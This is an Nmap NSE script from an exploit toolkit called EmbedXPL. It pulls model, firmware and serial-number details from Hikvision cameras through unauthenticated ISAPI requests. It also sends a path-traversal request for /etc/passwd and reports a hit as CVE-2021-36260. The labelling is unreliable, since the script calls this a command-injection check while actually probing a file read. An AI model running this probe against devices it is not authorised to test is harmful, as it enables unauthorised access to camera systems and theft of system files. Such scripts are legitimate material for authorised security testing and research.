-- embedxpl-hikvision-info.nse
-- EmbedXPL v5.0.0 — Custom NSE
-- Hikvision camera information disclosure via ISAPI.
-- Based on: embedxpl/modules/scanners/cameras/hikvision/firmware_version_fingerprint.py
-- Authors: André Henrique (@mrhenrike) | União Geek

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local json = require "json"

description = [[
EmbedXPL Hikvision Info.
Retrieves firmware version, model, serial number via ISAPI (unauthenticated).
Also checks for CVE-2021-36260 (command injection) vulnerability.
]]

categories = {"discovery", "vuln", "embedxpl"}
portrule = shortport.http

local ISAPI_PATHS = {
    "/ISAPI/System/deviceInfo",
    "/ISAPI/Security/userCheck",
    "/ISAPI/System/time",
    "/doc/page/login.asp",
}

action = function(host, port)
    local results = {}

    -- Try unauthenticated ISAPI
    local resp = http.get(host, port, "/ISAPI/System/deviceInfo", {timeout=5000})
    if resp and resp.status == 200 and resp.body then
        results[#results+1] = "Hikvision ISAPI (unauthenticated access!):"
        -- Extract fields
        for field, pattern in pairs({
            Model       = "<model>(.-)</model>",
            Firmware    = "<firmwareVersion>(.-)</firmwareVersion>",
            Serial      = "<serialNumber>(.-)</serialNumber>",
            DeviceType  = "<deviceType>(.-)</deviceType>",
        }) do
            local val = resp.body:match(pattern)
            if val then results[#results+1] = string.format("  %s: %s", field, val) end
        end

        -- Check CVE-2021-36260
        local cve_resp = http.get(host, port,
            "/uapi-cgi/certmanager.cgi?action=export&type=./../../etc/passwd",
            {timeout=5000})
        if cve_resp and cve_resp.status == 200 and
           (cve_resp.body:find("root:") or cve_resp.body:find("admin:")) then
            results[#results+1] = "  VULNERABLE: CVE-2021-36260 (unauthenticated command injection)"
        end
    else
        -- Try login page fingerprint
        local login = http.get(host, port, "/doc/page/login.asp", {timeout=3000})
        if login and login.body and login.body:find("[Hh]ikvision") then
            results[#results+1] = "Hikvision login page detected (authentication required)"
        else
            return nil
        end
    end

    return table.concat(results, "\n")
end
